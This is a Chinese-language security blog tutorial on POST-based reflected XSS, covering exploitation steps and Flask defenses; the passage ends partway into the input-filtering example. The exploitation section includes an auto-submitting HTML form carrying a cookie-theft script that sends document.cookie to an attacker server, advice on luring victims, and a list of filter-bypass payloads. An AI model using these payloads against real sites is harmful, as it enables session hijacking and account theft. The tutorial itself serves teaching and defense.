@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="反射型 XSS 并非只有 GET 版本，POST 型虽然更隐蔽、利用门槛更高，但也是渗透测试/安全开发中必须掌握的知识点。我会从原理→特征→利用方式→防御方法">
+<title>反射型 XSS（POST 型）详解</title>
+
+<link rel='canonical' href='https://lloyal-sudo.github.io/lloyal-sudo01/p/%E5%8F%8D%E5%B0%84%E5%9E%8B-xsspost-%E5%9E%8B%E8%AF%A6%E8%A7%A3/'>
+
+<link rel="stylesheet" href="/lloyal-sudo01/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css"><meta property='og:title' content="反射型 XSS（POST 型）详解">
+<meta property='og:description' content="反射型 XSS 并非只有 GET 版本，POST 型虽然更隐蔽、利用门槛更高，但也是渗透测试/安全开发中必须掌握的知识点。我会从原理→特征→利用方式→防御方法">
+<meta property='og:url' content='https://lloyal-sudo.github.io/lloyal-sudo01/p/%E5%8F%8D%E5%B0%84%E5%9E%8B-xsspost-%E5%9E%8B%E8%AF%A6%E8%A7%A3/'>
+<meta property='og:site_name' content='Loyal'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-03-19T20:24:48&#43;08:00'/><meta property='article:modified_time' content='2026-03-19T20:24:48&#43;08:00'/>
+<meta name="twitter:title" content="反射型 XSS（POST 型）详解">
+<meta name="twitter:description" content="反射型 XSS 并非只有 GET 版本，POST 型虽然更隐蔽、利用门槛更高，但也是渗透测试/安全开发中必须掌握的知识点。我会从原理→特征→利用方式→防御方法">
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/lloyal-sudo01/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/lloyal-sudo01/img/avatar_hu6173231718797166606.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">👻</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/lloyal-sudo01">Loyal</a></h1>
+            <h2 class="site-description">欢迎来到我的网站！</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://lloyal-sudo.github.io/lloyal-sudo01/en/" >English</option>
+                                
+                                    <option value="https://lloyal-sudo.github.io/lloyal-sudo01/" selected>简体中文</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#一反射型-xsspost-型核心介绍">一、反射型 XSS（POST 型）核心介绍</a>
+      <ol>
+        <li><a href="#1-定义">1. 定义</a></li>
+        <li><a href="#2-和-get-型反射-xss-的核心区别">2. 和 GET 型反射 XSS 的核心区别</a></li>
+        <li><a href="#3-典型应用场景">3. 典型应用场景</a></li>
+        <li><a href="#4-核心特征">4. 核心特征</a></li>
+      </ol>
+    </li>
+    <li><a href="#二反射型-xsspost-型的利用方式解题渗透思路">二、反射型 XSS（POST 型）的利用方式（解题/渗透思路）</a>
+      <ol>
+        <li><a href="#核心思路">核心思路</a></li>
+        <li><a href="#详细利用步骤">详细利用步骤</a>
+          <ol>
+            <li><a href="#步骤-1找到-post-型反射-xss-漏洞点">步骤 1：找到 POST 型反射 XSS 漏洞点</a></li>
+            <li><a href="#步骤-2构造恶意表单诱导用户触发">步骤 2：构造恶意表单（诱导用户触发）</a></li>
+            <li><a href="#步骤-3诱导用户访问恶意页面">步骤 3：诱导用户访问恶意页面</a></li>
+            <li><a href="#步骤-4绕过过滤和-get-型一致">步骤 4：绕过过滤（和 GET 型一致）</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#三反射型-xsspost-型的防御方法核心实战可用">三、反射型 XSS（POST 型）的防御方法（核心/实战可用）</a>
+      <ol>
+        <li><a href="#1-核心防御输出转义最有效">1. 核心防御：输出转义（最有效）</a>
+          <ol>
+            <li><a href="#实战代码示例以-pythonflask-为例">实战代码示例（以 Python/Flask 为例）</a></li>
+          </ol>
+        </li>
+        <li><a href="#2-输入过滤辅助防御">2. 输入过滤（辅助防御）</a></li>
+        <li><a href="#3-禁用危险操作前端后端">3. 禁用危险操作（前端+后端）</a></li>
+        <li><a href="#4-开启-csp内容安全策略">4. 开启 CSP（内容安全策略）</a>
+          <ol>
+            <li><a href="#flask-中配置-csp-示例">Flask 中配置 CSP 示例：</a></li>
+          </ol>
+        </li>
+        <li><a href="#5-cookie-配置-httponly">5. Cookie 配置 HttpOnly</a></li>
+      </ol>
+    </li>
+    <li><a href="#四实战防御总结落地优先级">四、实战防御总结（落地优先级）</a>
+      <ol>
+        <li><a href="#总结">总结</a></li>
+      </ol>
+    </li>
+    <li><a href="#补充post请求介绍及查看方式">补充：POST请求介绍及查看方式</a>
+      <ol>
+        <li><a href="#在哪里查看-post-请求">在哪里查看 POST 请求？</a>
+          <ol>
+            <li><a href="#1-浏览器开发者工具最常用无需额外安装">1. 浏览器开发者工具（最常用，无需额外安装）</a></li>
+            <li><a href="#2-接口调试工具开发测试时用">2. 接口调试工具（开发/测试时用）</a></li>
+            <li><a href="#3-后端日志服务器端查看">3. 后端日志（服务器端查看）</a></li>
+          </ol>
+        </li>
+        <li><a href="#总结-1">总结</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/lloyal-sudo01/p/%E5%8F%8D%E5%B0%84%E5%9E%8B-xsspost-%E5%9E%8B%E8%AF%A6%E8%A7%A3/">反射型 XSS（POST 型）详解</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-03-19</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>反射型 XSS 并非只有 GET 版本，POST 型虽然更隐蔽、利用门槛更高，但也是渗透测试/安全开发中必须掌握的知识点。我会从<strong>原理→特征→利用方式→防御方法</strong>一步步讲透，结合实战场景让你理解。</p>
+<h2 id="一反射型-xsspost-型核心介绍">一、反射型 XSS（POST 型）核心介绍
+</h2><h3 id="1-定义">1. 定义
+</h3><p>攻击者构造包含恶意 JS 代码的 <strong>POST 请求</strong>（数据在请求体中，而非 URL），诱导受害者触发该请求；服务器接收到 POST 参数后，未做过滤/转义就直接将参数内容反射到页面中，浏览器执行恶意代码完成攻击。</p>
+<h3 id="2-和-get-型反射-xss-的核心区别">2. 和 GET 型反射 XSS 的核心区别
+</h3><div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>反射型 XSS（GET）</th>
+<th>反射型 XSS（POST）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>数据传输位置</td>
+<td>URL 参数（可见，如 <code>?name=xxx</code>）</td>
+<td>POST 请求体（不可见）</td>
+</tr>
+<tr>
+<td>利用难度</td>
+<td>低（直接发链接即可）</td>
+<td>高（需诱导用户提交 POST 表单）</td>
+</tr>
+<tr>
+<td>隐蔽性</td>
+<td>低（URL 含恶意代码）</td>
+<td>高（请求体无迹可寻）</td>
+</tr>
+<tr>
+<td>常见场景</td>
+<td>搜索、URL 回显</td>
+<td>登录失败、表单提交反馈、留言预览</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="3-典型应用场景">3. 典型应用场景
+</h3><ul>
+<li>登录失败页面：提交错误账号密码后，页面回显“用户名 <code>xxx</code> 不存在”，若 <code>xxx</code> 未过滤则触发；</li>
+<li>表单提交预览：POST 提交表单后，页面“预览”提交内容，未过滤参数；</li>
+<li>后台数据查询：POST 提交查询条件，页面回显查询关键词/结果，未转义；</li>
+<li>错误提示页面：POST 参数作为错误信息回显（如“参数 <code>xxx</code> 格式错误”）。</li>
+</ul>
+<h3 id="4-核心特征">4. 核心特征
+</h3><ul>
+<li><strong>非持久化</strong>：恶意代码仅在本次 POST 请求的响应中反射，不存入数据库；</li>
+<li><strong>依赖 POST 请求</strong>：无法通过简单的 URL 链接触发，需诱导用户提交包含恶意代码的表单；</li>
+<li><strong>危害范围</strong>：虽利用门槛高，但一旦触发，危害和 GET 型完全一致（偷 Cookie、劫持账号等）。</li>
+</ul>
+<h2 id="二反射型-xsspost-型的利用方式解题渗透思路">二、反射型 XSS（POST 型）的利用方式（解题/渗透思路）
+</h2><h3 id="核心思路">核心思路
+</h3><p>构造恶意 POST 表单 → 诱导用户提交 → 服务器反射恶意代码 → 执行攻击。</p>
+<h3 id="详细利用步骤">详细利用步骤
+</h3><h4 id="步骤-1找到-post-型反射-xss-漏洞点">步骤 1：找到 POST 型反射 XSS 漏洞点
+</h4><ol>
+<li>找到使用 POST 提交的功能（如登录、表单提交）；</li>
+<li>抓包（用 Burp Suite/F12 开发者工具）查看 POST 参数；</li>
+<li>向参数中插入测试代码（如 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>），提交后观察页面是否回显该参数且执行代码。</li>
+</ol>
+<p><strong>示例场景</strong>：<br>
+登录页面提交 <code>username=&lt;script&gt;alert(1)&lt;/script&gt;&amp;password=123</code>，服务器返回“用户名 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 不存在”，且弹窗 → 存在 POST 型反射 XSS。</p>
+<h4 id="步骤-2构造恶意表单诱导用户触发">步骤 2：构造恶意表单（诱导用户触发）
+</h4><p>由于 POST 请求无法通过 URL 直接触发，攻击者需构造一个<strong>恶意 HTML 页面</strong>，包含自动提交的 POST 表单：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 恶意页面：auto_submit.html --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 自动提交 POST 请求到目标网站 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;xss_form&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://目标网站/login&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 恶意代码注入到 username 参数 --&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;script&gt;document.location=&#39;http://攻击者服务器/steal?c=&#39;+document.cookie&lt;/script&gt;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;123456&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 页面加载后自动提交表单 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;xss_form&#34;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="步骤-3诱导用户访问恶意页面">步骤 3：诱导用户访问恶意页面
+</h4><ul>
+<li>将 <code>auto_submit.html</code> 放到攻击者的服务器上；</li>
+<li>诱导受害者点击该页面链接（如伪装成“登录领福利”“账号安全验证”）；</li>
+<li>受害者打开页面后，自动提交 POST 请求到目标网站，触发 XSS 漏洞，Cookie 被窃取。</li>
+</ul>
+<h4 id="步骤-4绕过过滤和-get-型一致">步骤 4：绕过过滤（和 GET 型一致）
+</h4><p>若基础测试代码不生效，用以下常见绕过方式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 1. 替换标签（过滤 script） --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;img src=x onerror=alert(1)&gt;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 2. 大小写绕过 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 3. 实体编码绕过 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 4. 双写绕过 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="三反射型-xsspost-型的防御方法核心实战可用">三、反射型 XSS（POST 型）的防御方法（核心/实战可用）
+</h2><p>POST 型 XSS 的防御逻辑和 GET 型一致，核心是<strong>过滤输入、转义输出</strong>，以下是落地性极强的防御方案：</p>
+<h3 id="1-核心防御输出转义最有效">1. 核心防御：输出转义（最有效）
+</h3><p>服务器将 POST 参数输出到页面时，对<strong>所有特殊字符</strong>做 HTML 转义，彻底阻止 JS 执行：</p>
+<ul>
+<li><code>&lt;</code> → <code>&amp;lt;</code></li>
+<li><code>&gt;</code> → <code>&amp;gt;</code></li>
+<li><code>&quot;</code> → <code>&amp;quot;</code></li>
+<li><code>'</code> → <code>&amp;#x27;</code></li>
+<li><code>&amp;</code> → <code>&amp;amp;</code></li>
+</ul>
+<h4 id="实战代码示例以-pythonflask-为例">实战代码示例（以 Python/Flask 为例）
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">html</span>  <span class="c1"># Python 内置转义模块</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取 POST 参数</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 关键：输出前做 HTML 转义</span>
+</span></span><span class="line"><span class="cl">    <span class="n">safe_username</span> <span class="o">=</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 回显转义后的内容，彻底阻止 XSS</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;用户名 </span><span class="si">{</span><span class="n">safe_username</span><span class="si">}</span><span class="s2"> 不存在，请重新输入&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2-输入过滤辅助防御">2. 输入过滤（辅助防御）
+</h3><p>对 POST 参数做<strong>白名单校验</strong>（仅允许合法字符），拒绝危险内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 示例：仅允许用户名包含字母、数字、下划线</span>
